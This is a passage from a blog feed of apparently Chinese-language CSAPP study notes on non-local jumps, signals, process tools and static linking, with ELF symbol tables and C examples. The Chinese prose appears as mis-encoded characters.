class="hljs-string">&lt;setjmp.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br>jmp_buf buf;<br><br><span class="hljs-type">int</span> error1 = <span class="hljs-number">1</span>;<br><span class="hljs-type">int</span> error2 = <span class="hljs-number">1</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">foo</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>, <span class="hljs-title function_">bar</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">switch</span> (setjmp(buf)) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>        foo();<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Detected an error1 condition in foo\n&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Detected an error2 condition in foo\n&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Unknown error condition in foo\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-comment">/* Deeply nested function foo */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">foo</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;call in foo\n&quot;</span>);<br>    <span class="hljs-keyword">if</span> (error1)<br>        longjmp(buf, <span class="hljs-number">1</span>);<br>    bar();<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">bar</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;call in bar\n&quot;</span>);<br>    <span class="hljs-keyword">if</span> (error2)<br>        longjmp(buf, <span class="hljs-number">2</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p> <code>setjmp</code> å‡½æ•°è°ƒç”¨ä¸€æ¬¡è¿”å›å¤šæ¬¡ï¼Œè°ƒç”¨ä¼šæŠŠå½“å‰çŠ¶æ€ä¿å­˜åœ¨ <code>buf</code> ä¸­å¹¶è¿”å› 0ã€‚ç›´åˆ°åé¢é‡åˆ° <code>longjmp</code> æ—¶ï¼Œä¼šæ ¹æ®ä¿å­˜çš„ä½ç½®æ¢å¤å¯„å­˜å™¨çŠ¶æ€ï¼Œå¹¶å°†è¿”å›å€¼ç½®ä¸ºç¬¬äºŒä¸ªå‚æ•°ã€‚</p><p>éæœ¬åœ°è·³è½¬çš„å¦ä¸€ä¸ªå¦™ç”¨æ˜¯å¯ä»¥åœ¨æ¥æ”¶ä¿¡å·çš„æ—¶å€™ä¸è¿”å›è¢«ä¸­æ–­çš„ä½ç½®ï¼Œä¹Ÿä¸ç›´æ¥é€€å‡ºï¼Œè€Œæ˜¯å¯ä»¥é‡æ–°æŒ‡å®šè·³è½¬ä½ç½®ã€‚</p><p>å¦‚ä¸‹ï¼Œå½“ç”¨æˆ·åœ¨é”®ç›˜ä¸Šé”®å…¥ Ctrl+C æ—¶ï¼Œè¿™ä¸ªç¨‹åºç”¨ä¿¡å·å’Œéæœ¬åœ°è·³è½¬æ¥å®ç°è½¯é‡å¯ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;setjmp.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><br>sigjmp_buf buf;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">handler</span><span class="hljs-params">(<span class="hljs-type">int</span> sig)</span><br>&#123;<br>    siglongjmp(buf, <span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (!sigsetjmp(buf, <span class="hljs-number">1</span>)) &#123;<br>        signal(SIGINT, handler);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;starting&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;restarting&quot;</span>);<br><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>        sleep(<span class="hljs-number">1</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;processing...&quot;</span>);<br>    &#125;<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>); <span class="hljs-comment">/* Control never reaches here */</span><br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨ <code>while 1</code> ä¸­å½“æˆ‘ä»¬æŒ‰ä¸‹ <code>Ctrl+C</code>ï¼ŒæŒ‡ä»¤åœ¨å¾ªç¯ä¸­çš„ä¸€ä¸ªåœ°æ–¹è¢«ä¸­æ–­ã€‚å¦‚æœæ²¡æœ‰ <code>setjmp</code> å’Œ <code>longjmp</code> çš„å¤„ç†ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ”¶åˆ°è¿™ä¸ªä¿¡å·ä¹‹åï¼Œè¦ä¹ˆæ¥ç€å›å»ï¼ˆreturnï¼‰ï¼Œè¦ä¹ˆé€€å‡ºï¼ˆexitï¼‰ï¼Œä½†æ˜¯æœ‰äº†è¿™ä¸¤ä¸ªå‡½æ•°ï¼Œæˆ‘ä»¬å°±å¯ä»¥è®¾ç½®ä¸€ä¸ªç‚¹ä½ï¼Œè®©å®ƒä¿¡å·å¤„ç†å®Œæ¯•ä¹‹åéƒ½å›åˆ°é‚£ä¸ªç‚¹ä½å»ã€‚</p><h1 id="æ“ä½œè¿›ç¨‹çš„å·¥å…·"><a href="#æ“ä½œè¿›ç¨‹çš„å·¥å…·" class="headerlink" title="æ“ä½œè¿›ç¨‹çš„å·¥å…·"></a>æ“ä½œè¿›ç¨‹çš„å·¥å…·</h1><p>Linux ä¸ºæˆ‘ä»¬æä¾›äº†å¤§é‡æ“ä½œè¿›ç¨‹çš„å·¥å…·</p><ul><li><strong>STRACEï¼š</strong>æ‰“å°ä¸€ä¸ªæ­£åœ¨è¿è¡Œçš„ç¨‹åºå’Œå®ƒçš„å­è¿›ç¨‹è°ƒç”¨çš„æ¯ä¸ªç³»ç»Ÿè°ƒç”¨çš„è½¨è¿¹ã€‚</li><li><strong>PSï¼š</strong>åˆ—å‡ºå½“å‰ç³»ç»Ÿä¸­çš„è¿›ç¨‹ï¼ˆåŒ…æ‹¬åƒµæ­»è¿›ç¨‹ï¼‰ã€‚</li><li><strong>TOPï¼š</strong>æ‰“å°å‡ºå…³äºå½“å‰è¿›ç¨‹èµ„æºä½¿ç”¨çš„ä¿¡æ¯ã€‚</li><li><strong>PMAPï¼š</strong>æ˜¾ç¤ºè¿›ç¨‹çš„å†…å­˜æ˜ å°„ã€‚</li><li><strong>&#x2F;procï¼š</strong>ä¸€ä¸ªè™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿï¼Œä»¥ ASCII æ–‡æœ¬æ ¼å¼è¾“å‡ºå¤§é‡å†…æ ¸æ•°æ®ç»“æ„çš„å†…å®¹ï¼Œç”¨æˆ·ç¨‹åºå¯ä»¥è¯»å–è¿™äº›å†…å®¹ã€‚æ¯”å¦‚ï¼Œè¾“å…¥ â€œcat&#x2F;proc&#x2F;loadavgâ€ï¼Œå¯ä»¥çœ‹åˆ° Linux ç³»ç»Ÿä¸Šå½“å‰çš„å¹³å‡è´Ÿè½½ã€‚</li></ul><hr><p>è®²çš„å¾ˆç»†å¾ˆç»†ï¼Œæœ‰ä¸€ç‚¹éš¾æ‡‚ï¼Œè¿˜æ˜¯éœ€è¦æ²‰æ·€ä¸€ä¸‹ğŸ« </p><p>ä¸ºä»€ä¹ˆæœ€è¿‘æ€»æ˜¯å›°å›°çš„</p>]]></content>
    
    
    <categories>
      
      <category>è¯»ä¹¦ç¬”è®°</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>CSAPP</tag>
      
      <tag>å¼‚å¸¸</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSAPP ç¬¬ä¸ƒç«  é“¾æ¥</title>
    <link href="/2023/11/28/CSAPP-%E7%AC%AC%E4%B8%83%E7%AB%A0-%E9%93%BE%E6%8E%A5/"/>
    <url>/2023/11/28/CSAPP-%E7%AC%AC%E4%B8%83%E7%AB%A0-%E9%93%BE%E6%8E%A5/</url>
    
    <content type="html"><![CDATA[<p>åŠ¨æ€é“¾æ¥å’Œé™æ€é“¾æ¥</p><span id="more"></span><p>é“¾æ¥ï¼ˆlinkingï¼‰ï¼šå°†å„ç§ä»£ç å’Œæ•°æ®ç‰‡æ®µæ”¶é›†å¹¶ç»„åˆæˆä¸ºä¸€ä¸ªå•ä¸€æ–‡ä»¶çš„è¿‡ç¨‹ï¼Œè¿™ä¸ªæ–‡ä»¶å¯è¢«åŠ è½½ï¼ˆå¤åˆ¶ï¼‰åˆ°å†…å­˜å¹¶æ‰§è¡Œã€‚å°±æ˜¯æˆ‘ä»¬ä¹‹å‰æœ‰å­¦è¿‡çš„ç¼–è¯‘æ–‡ä»¶çš„æœ€åä¸€æ­¥ï¼Œåˆ†é™æ€å’ŒåŠ¨æ€é“¾æ¥ä¸¤ç§å¯èƒ½ã€‚</p><p>åœ¨ç°ä»£ç³»ç»Ÿä¸­ï¼Œé“¾æ¥æ˜¯ç”±å«åšé“¾æ¥å™¨ï¼ˆlinkerï¼‰çš„ç¨‹åºè‡ªåŠ¨æ‰§è¡Œçš„ã€‚</p><h1 id="ç¼–è¯‘å™¨é©±åŠ¨ç¨‹åº"><a href="#ç¼–è¯‘å™¨é©±åŠ¨ç¨‹åº" class="headerlink" title="ç¼–è¯‘å™¨é©±åŠ¨ç¨‹åº"></a>ç¼–è¯‘å™¨é©±åŠ¨ç¨‹åº</h1><p>æˆ‘ä»¬è¿™ä¸€ç« éƒ½æ˜¯åœ¨ç”¨ä¸‹é¢çš„å°å‡½æ•°ç¤ºä¾‹è®²è§£å­¦ä¹ çš„ï¼š</p><blockquote><p>è¿™æ˜¯ä¸¤ä¸ªæºæ–‡ä»¶åˆ†åˆ«æ˜¯ main.c å’Œ sum.c</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//main.c</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">sum</span><span class="hljs-params">(<span class="hljs-type">int</span> *a, <span class="hljs-type">int</span> n)</span>;<br><span class="hljs-type">int</span> arry[<span class="hljs-number">2</span>]=&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>&#125;<br><br><span class="hljs-type">int</span> main()<br>&#123;<br><span class="hljs-type">int</span> val=sum(<span class="hljs-built_in">array</span>,<span class="hljs-number">2</span>);<br><span class="hljs-keyword">return</span> val;<br>&#125;<br><br><span class="hljs-comment">//sum.c</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">sum</span><span class="hljs-params">(<span class="hljs-type">int</span> *a,<span class="hljs-type">int</span> n)</span><br>&#123;<br>    <span class="hljs-type">int</span> i,s=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>    &#123;<br>        s+=a[i]<br>    &#125;<br>    <span class="hljs-keyword">return</span> s;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¤§å¤šç¼–è¯‘ç³»ç»Ÿæä¾›ç¼–è¯‘å™¨é©±åŠ¨ç¨‹åºï¼ˆå¦‚ gcc ï¼‰ï¼Œå®ƒå®é™…ä¸Šæ˜¯å¹¿ä¹‰çš„â€ç¼–è¯‘å™¨â€œï¼Œæ˜¯è¯­è¨€é¢„å¤„ç†å™¨ã€ç¼–è¯‘å™¨ã€æ±‡ç¼–å™¨å’Œè¿æ¥å™¨çš„é›†åˆã€‚</p><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤æŠŠä¸¤ä¸ªæ–‡ä»¶é“¾æ¥åœ¨ä¸€èµ·ç¼–è¯‘ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc -o prog main.c sum.c<br></code></pre></td></tr></table></figure><p>å½“ç„¶ä¹Ÿå¯ä»¥å°†è¿™ä¸ªå‘½ä»¤æ‹†æ¥æ¥ç¼–è¯‘ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#é¢„ç¼–è¯‘ï¼šå±•å¼€å¤´æ–‡ä»¶å’Œæ›¿æ¢å®å®šä¹‰</span><br>cpp main.c /tmp/main.i<br><br><span class="hljs-comment">#ç¼–è¯‘ï¼šå°†é«˜çº§è¯­è¨€ç¿»è¯‘æˆä½çº§è¯­è¨€</span><br>cc1 /tmp/main.i /tmp/main.s<br><br><span class="hljs-comment">#æ±‡ç¼–ï¼šå°†æ±‡ç¼–è¯­è¨€ç¿»è¯‘æˆæœºå™¨è¯­è¨€</span><br>as /tmp/main.s /tmp/main.o<br><br><span class="hljs-comment">#sum.cæ–‡ä»¶ç›¸åŒã€‚</span><br><span class="hljs-comment">#é“¾æ¥ï¼šå°†æ–‡ä»¶è¿æ¥åœ¨ä¸€èµ·ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶</span><br>ld -o prog /tmp/main.o /tmp/sum.o <br></code></pre></td></tr></table></figure><h1 id="é™æ€é“¾æ¥"><a href="#é™æ€é“¾æ¥" class="headerlink" title="é™æ€é“¾æ¥"></a>é™æ€é“¾æ¥</h1><p>æˆ‘ä»¬çš„å‘½ä»¤ ld å°±æ˜¯è°ƒç”¨äº† Linux LD ç¨‹åºè¿™æ ·çš„é™æ€é“¾æ¥å™¨ï¼Œå®ƒä»¥ä¸€ç»„å¯é‡å®šä½ç›®æ ‡æ–‡ä»¶å’Œå‘½ä»¤è¡Œå‚æ•°ä½œä¸ºè¾“å…¥ï¼Œç”Ÿæˆä¸€ä¸ªå®Œå…¨è¿æ¥çš„ã€å¯ä»¥åŠ è½½å’Œè¿è¡Œçš„å¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶ä½œä¸ºè¾“å…¥ã€‚</p><p>è¿æ¥å™¨è¦å®Œæˆä¸¤ä¸ªä¸»è¦ä»»åŠ¡æ‰èƒ½å®ç°é“¾æ¥ç›®çš„ï¼š</p><ul><li>ç¬¦å·è§£æï¼šå°†æ¯ä¸ªç¬¦å·å¼•ç”¨å’Œä¸€ä¸ªç¬¦å·å®šä¹‰å…³è”èµ·æ¥</li><li>é‡å®šä½ï¼šç¼–è¯‘å™¨å’Œæ±‡ç¼–å™¨ç”Ÿæˆä»åœ°å€ 0 å¼€å§‹çš„ä»£ç å’Œæ•°æ®èŠ‚ï¼Œå°†æ¯ä¸€ä¸ªç¬¦å·å¼•ç”¨å’Œä¸€ä¸ªå†…å­˜ä½ç½®å…³è”èµ·æ¥ã€‚</li></ul><h1 id="ç›®æ ‡æ–‡ä»¶"><a href="#ç›®æ ‡æ–‡ä»¶" class="headerlink" title="ç›®æ ‡æ–‡ä»¶"></a>ç›®æ ‡æ–‡ä»¶</h1><p>ç›®æ ‡æ–‡ä»¶æœ‰ä¸‰ç§å½¢å¼ï¼š</p><ul><li>å¯é‡å®šä½ç›®æ ‡æ–‡ä»¶ï¼ˆ.oï¼‰ï¼šåŒ…å«äºŒè¿›åˆ¶ä»£ç å’Œæ•°æ®ï¼Œå…¶å½¢å¼å¯ä»¥åœ¨ç¼–è¯‘æ—¶ä¸å…¶ä»–å¯é‡å®šä½ç›®æ ‡æ–‡ä»¶åˆå¹¶èµ·æ¥ï¼Œåˆ›å»ºä¸€ä¸ªå¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶ã€‚</li><li>å¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶ï¼ˆ.elfï¼‰ï¼šåŒ…å«äºŒè¿›åˆ¶ä»£ç å’Œæ•°æ®ï¼Œå…¶å½¢å¼å¯ä»¥è¢«ç›´æ¥å¤åˆ¶åˆ°å†…å­˜å¹¶æ‰§è¡Œã€‚</li><li>å…±äº«ç›®æ ‡æ–‡ä»¶ï¼ˆ.libcï¼‰ï¼šä¸€ç§ç‰¹æ®Šç±»å‹çš„å¯é‡å®šä½ç›®æ ‡æ–‡ä»¶ï¼Œå¯ä»¥åœ¨åŠ è½½æˆ–è€…è¿è¡Œæ—¶è¢«åŠ¨æ€åœ°åŠ è½½è¿›å†…å­˜å¹¶é“¾æ¥ã€‚</li></ul><h1 id="å¯é‡å®šç›®æ ‡æ–‡ä»¶"><a href="#å¯é‡å®šç›®æ ‡æ–‡ä»¶" class="headerlink" title="å¯é‡å®šç›®æ ‡æ–‡ä»¶"></a>å¯é‡å®šç›®æ ‡æ–‡ä»¶</h1><p>å¯é‡å®šç›®æ ‡æ–‡ä»¶åˆ†æˆå‡ ä¸ªéƒ¨åˆ†ï¼š</p><ul><li>.textï¼šå·²ç¼–è¯‘ç¨‹åºçš„æœºå™¨ä»£ç æ®µ</li><li>.rodataï¼šåªè¯»æ•°æ®æ®µ</li><li>.dataï¼šå·²åˆå§‹åŒ–çš„å…¨å±€å˜é‡å’Œé™æ€å˜é‡</li><li>.bssï¼šæœªåˆå§‹åŒ–å…¨å±€å˜é‡å’Œé™æ€å˜é‡</li><li>.symtabï¼šç¬¦å·è¡¨ï¼Œä¿å­˜å…¨å±€å˜é‡çš„ä¿¡æ¯ã€‚é»˜è®¤ç”Ÿæˆï¼Œå¯ä»¥ä½¿ç”¨STRIPå‘½ä»¤å»é™¤ã€‚</li><li>.rel.textï¼šä¸€ä¸ª.text å€Ÿä¸­çš„ä½ç½®è¡¨ï¼Œè¢«é“¾æ¥çš„æ—¶å€™ä¼šè¢«ä¿®æ”¹ä½ç½®ã€‚</li><li>.rel.dataï¼šè¢«æ¨¡å—å¼•ç”¨æˆ–å®šä¹‰çš„æ‰€æœ‰å…¨å±€å˜é‡çš„é‡å®šä½ä¿¡æ¯ï¼Œè¢«é“¾æ¥çš„æ—¶å€™ä¼šè¢«ä¿®æ”¹ä½ç½®ã€‚</li><li>.debugï¼šè°ƒè¯•ç¬¦å·è¡¨ï¼Œåªæœ‰ä»¥ -g é€‰é¡¹æ—¶ä¼šå¾—åˆ°è¿™å¼ è¡¨ï¼Œå…¶ä¸­åŒ…å«äº†å±€éƒ¨å˜é‡çš„å®šä¹‰å’Œç±»å‹ï¼Œä»¥åŠåŸå§‹çš„ C æ–‡ä»¶ï¼Œåªæœ‰ -g å‘½ä»¤ä¼šç”Ÿæˆè¿™å¼ è¡¨ã€‚</li><li>.lineï¼šåŸå§‹ Cæºç¨‹åºä¸­çš„è¡Œå·å’Œtext èŠ‚ä¸­æœºå™¨æŒ‡ä»¤ä¹‹é—´çš„æ˜ å°„ã€‚åªæœ‰ä»¥-g é€‰é¡¹è°ƒç”¨ç¼–è¯‘å™¨é©±åŠ¨ç¨‹åºæ—¶ï¼Œæ‰ä¼šå¾—åˆ°è¿™å¼ è¡¨ã€‚</li><li>.strtabï¼šä¸€ä¸ªå­—ç¬¦ä¸²è¡¨ï¼Œå…¶å†…å®¹åŒ…æ‹¬ .symtab å’Œ .debug èŠ‚ä¸­çš„ç¬¦å·è¡¨ï¼Œä»¥åŠèŠ‚å¤´éƒ¨ä¸­çš„èŠ‚åå­—ã€‚</li></ul><p>åŒæ˜¯ç¨‹åºä¸­çš„å˜é‡ï¼ŒåŒºåˆ† .bss æ®µ .data æ®µçš„åŸå› æ˜¯åˆå§‹åŒ–çš„å˜é‡éœ€è¦ä½¿ç”¨ä¸€æ®µç©ºé—´å»ä¿å­˜åˆå§‹åŒ–å¾—åˆ°çš„å€¼ï¼Œè€Œæœªåˆå§‹åŒ–åˆ™ä¸éœ€è¦ï¼Œ .bss æ®µå­˜å‚¨ä¸ºåˆå§‹åŒ–æ•°æ®å¯ä»¥æ›´å¥½çš„èŠ‚çœç©ºé—´</p><h1 id="ç¬¦å·å’Œç¬¦å·è¡¨"><a href="#ç¬¦å·å’Œç¬¦å·è¡¨" class="headerlink" title="ç¬¦å·å’Œç¬¦å·è¡¨"></a>ç¬¦å·å’Œç¬¦å·è¡¨</h1><p>æ¯ä¸ª<strong>å¯é‡å®šä½ç›®æ ‡</strong>æ¨¡å— m éƒ½æœ‰ä¸€ä¸ªç¬¦å·è¡¨ï¼Œå®ƒåŒ…å« m å®šä¹‰å’Œå¼•ç”¨çš„ç¬¦å·çš„ä¿¡æ¯ã€‚åœ¨é“¾æ¥å™¨çš„ä¸Šä¸‹æ–‡ä¸­ï¼Œæœ‰ä¸‰ç§ä¸åŒçš„ç¬¦å·ï¼š</p><ul><li><p>æ¨¡å— m å®šä¹‰å¹¶èƒ½è¢«å…¶ä»–æ¨¡å—å¼•ç”¨çš„å…¨å±€ç¬¦å·ã€‚å…¨å±€é“¾æ¥å™¨ç¬¦å·å¯¹åº”äºéé™æ€çš„Cå‡½æ•°å’Œå…¨å±€å˜é‡ã€‚</p></li><li><p>ç”±å…¶ä»–æ¨¡å—å®šä¹‰å¹¶è¢«æ¨¡å— m å¼•ç”¨çš„å…¨å±€ç¬¦å·ã€‚</p></li><li><p>åªè¢«æ¨¡å— m å®šä¹‰å’Œå¼•ç”¨çš„å±€éƒ¨ç¬¦å·ã€‚å®ƒä»¬å¯¹åº”äº†å¸¦ static å±æ€§çš„ C å‡½æ•°å’Œå…¨å±€å˜é‡ã€‚</p></li></ul><p>.symtab ä¸­çš„ç¬¦å·è¡¨å¹¶ä¸åŒ…å«å¯¹åº”äºæœ¬åœ°éé™æ€ç¨‹åºå˜é‡çš„ä»»ä½•ç¬¦å·ã€‚è¿™äº›ç¬¦å·åœ¨è¿è¡Œæ—¶åœ¨æ ˆä¸­è¢«ç®¡ç†ï¼Œè¿æ¥å™¨å¯¹æ­¤ç±»ç¬¦å·ä¸æ„Ÿå…´è¶£ã€‚</p><p>é™æ€çš„å±€éƒ¨å˜é‡ä¸ä¼šåœ¨æ ˆä¸­ç®¡ç†ï¼Œä¼šæ”¾åˆ° bss æˆ–è€…æ˜¯ data æ®µä¸Šã€‚</p><p>.symtab èŠ‚ä¸­ä¼šåŒ…å«ä¸€ä¸ª ELF ç¬¦å·è¡¨ï¼Œè¿™å¼ ç¬¦å·è¡¨åŒ…å«è¿™æ ·ä¸€ä¸ªç»“æ„ä½“æ¡ç›®çš„æ•°ç»„ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    <span class="hljs-type">int</span> name;        <span class="hljs-comment">/* String table offset */</span><br>    <span class="hljs-type">char</span> type:<span class="hljs-number">4</span>,     <span class="hljs-comment">/* Function or data (4 bits) */</span><br>    binding:<span class="hljs-number">4</span>;       <span class="hljs-comment">/* Local or global (4 bits) */</span><br>    <span class="hljs-type">char</span> reserved;   <span class="hljs-comment">/* Unused */</span><br>    <span class="hljs-type">short</span> section;   <span class="hljs-comment">/* Section header index */</span><br>    <span class="hljs-type">long</span> value;      <span class="hljs-comment">/* Section offset or absolute address */</span><br>    <span class="hljs-type">long</span> size;       <span class="hljs-comment">/* Object size in bytes */</span><br>&#125; Elf64_Symbol;<br></code></pre></td></tr></table></figure><p>æ¯ä¸ªç¬¦å·éƒ½è¢«åˆ†é…åˆ°ç›®æ ‡æ–‡ä»¶çš„æŸä¸ªèŠ‚ï¼Œç”± section å­—æ®µè¡¨ç¤ºï¼Œè¯¥å­—æ®µä¹Ÿæ˜¯ä¸€ä¸ªåˆ°èŠ‚å¤´éƒ¨è¡¨çš„ç´¢å¼•ã€‚</p><p>å¯¹äº section å­—æ®µæœ‰ä¸‰ä¸ªç‰¹æ®Šçš„ä¼ªèŠ‚ï¼Œå®ƒä»¬åœ¨èŠ‚å¤´éƒ¨è¡¨ä¸­æ˜¯æ²¡æœ‰æ¡ç›®çš„ï¼š</p><ul><li>ABS ä»£è¡¨ä¸è¯¥è¢«é‡å®šä½çš„ç¬¦å·ã€‚</li><li>UNDEF ä»£è¡¨æœªå®šä¹‰çš„ç¬¦å·ï¼Œä¹Ÿå°±æ˜¯åœ¨æœ¬ç›®æ ‡æ¨¡å—ä¸­ç”¨ï¼Œä½†æ˜¯å´åœ¨å…¶ä»–åœ°æ–¹å®šä¹‰çš„ç¬¦å·ã€‚</li><li>COMMON è¡¨ç¤ºè¿˜æœªè¢«åˆ†é…ä½ç½®çš„æœªåˆå§‹åŒ–çš„æ•°æ®ç›®æ ‡ã€‚</li></ul><blockquote><p>ç°ä»£çš„GCC ç‰ˆæœ¬æ ¹æ®ä»¥ä¸‹è§„åˆ™æ¥å°†å¯é‡å®šä½ç›®æ ‡æ–‡ä»¶ä¸­çš„ç¬¦å·åˆ†é…åˆ° COMMON å’Œ bss ä¸­ï¼š</p><p>COMMONï¼šæœªåˆå§‹åŒ–çš„å…¨å±€å˜é‡</p><p>.bss ï¼šæœªåˆå§‹åŒ–çš„é™æ€å˜é‡ï¼Œä»¥åŠåˆå§‹åŒ–ä¸º 0 çš„å…¨å±€æˆ–é™æ€å˜é‡</p></blockquote><h1 id="ç¬¦å·è§£æ"><a href="#ç¬¦å·è§£æ" class="headerlink" title="ç¬¦å·è§£æ"></a>ç¬¦å·è§£æ</h1><p>é“¾æ¥å™¨è§£æç¬¦å·å¼•ç”¨çš„æ–¹æ³•æ˜¯å°†æ¯ä¸ªå¼•ç”¨ä¸å®ƒè¾“å…¥çš„å¯é‡å®šä½ç›®æ ‡æ–‡ä»¶çš„ç¬¦å·è¡¨ä¸­çš„ä¸€ä¸ªç¡®å®šçš„ç¬¦å·å®šä¹‰å…³è”èµ·æ¥ã€‚</p><p>é™æ€å±€éƒ¨å˜é‡ä¹Ÿä¼šæœ‰æœ¬åœ°é“¾æ¥å™¨ç¬¦å·ï¼Œç¼–è¯‘å™¨è¿˜è¦ç¡®ä¿å®ƒä»¬æ‹¥æœ‰å”¯ä¸€çš„åå­—ã€‚ä¸è¿‡ï¼Œå¯¹å…¨å±€ç¬¦å·çš„å¼•ç”¨è§£æå°±æ£˜æ‰‹å¾—å¤šã€‚å½“ç¼–è¯‘å™¨é‡åˆ°ä¸€ä¸ªä¸æ˜¯åœ¨å½“å‰æ¨¡å—ä¸­å®šä¹‰çš„ç¬¦å·ï¼ˆå˜é‡æˆ–å‡½æ•°åï¼‰æ—¶ï¼Œä¼š<strong>å‡è®¾è¯¥ç¬¦å·æ˜¯åœ¨å…¶ä»–æŸä¸ªæ¨¡å—ä¸­å®šä¹‰çš„ï¼Œç”Ÿæˆä¸€ä¸ªé“¾æ¥å™¨ç¬¦å·è¡¨æ¡ç›®ï¼Œå¹¶æŠŠå®ƒäº¤ç»™é“¾æ¥å™¨å¤„ç†</strong>ã€‚</p><p>å¦‚æœé“¾æ¥å™¨åœ¨å®ƒçš„ä»»ä½•è¾“äººæ¨¡å—ä¸­éƒ½æ‰¾ä¸åˆ°è¿™ä¸ªè¢«å¼•ç”¨ç¬¦å·çš„å®šä¹‰ï¼Œå°±è¾“å‡ºä¸€æ¡(é€šå¸¸å¾ˆéš¾é˜…è¯»çš„)é”™è¯¯ä¿¡æ¯å¹¶ç»ˆæ­¢ã€‚</p><p>ä¾‹å¦‚ä¸‹é¢çš„æ–‡ä»¶ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 